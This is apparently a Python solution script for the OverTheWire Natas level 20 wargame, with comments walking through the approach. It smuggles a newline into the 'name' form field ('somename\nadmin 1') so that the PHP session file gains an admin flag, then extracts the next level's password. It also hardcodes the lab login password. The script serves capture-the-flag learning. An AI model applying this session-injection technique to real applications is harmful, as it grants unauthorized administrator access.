#!/bin/python3

import requests
import re
import html.parser
import codecs 

username = 'natas20'
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
url = 'http://%s.natas.labs.overthewire.org?debug=true' % (username)
name = "somename\nadmin 1"
data = { "name" : name , "submit" : "Change name"}
session = requests.Session()

response = session.post(url + '', auth = (username,password) )
PHPSESSID = response.cookies['PHPSESSID']
cookies = { "PHPSESSID" : PHPSESSID } 

response = session.post(url + '', cookies = cookies, data = data, auth = (username,password) )

response = session.post(url + '', cookies = cookies, data = data, auth = (username,password) )
content = response.text
print (re.findall("Password: (.*)</pre>",content)[0])

#on first connecting to the page we recieve a sid
#the sid is written as the name of a file 
#there is no data to write to the file, the $_session array seems to be empty

#if no name is provided then no data is written to the file 
#and obviously no data is printed out 

#this means that the only value in the session array is the value of name
#data is being written to the file as follows
#each key value pair in the array is taken individually 
#each key value pair is then printed
#data = "key" "value"\n
#as far as i can see there is only ever going to be one key value pair in session array

#the data is being read by splitting the file into lines 
#each line is printed
#each line is then split into two pieces (the first two pieces seperated by a " ")
#if the first section exists then $_session is updatad as follows
#$_SESSION[section[0]] = section[1]

#we need $_SESSION['admin'] = 1
#so we need section[0] = 'admin' and section[1] = 1

#if we set the value of name 
# "name" => "somename\nadmin 1"

#this will be written to the file as 

#name somename
#admin 1

#and wen it is read the read function will treat each line as a key value pair for $_SESSION
#and will set $_SESSION['admin'] to 1 

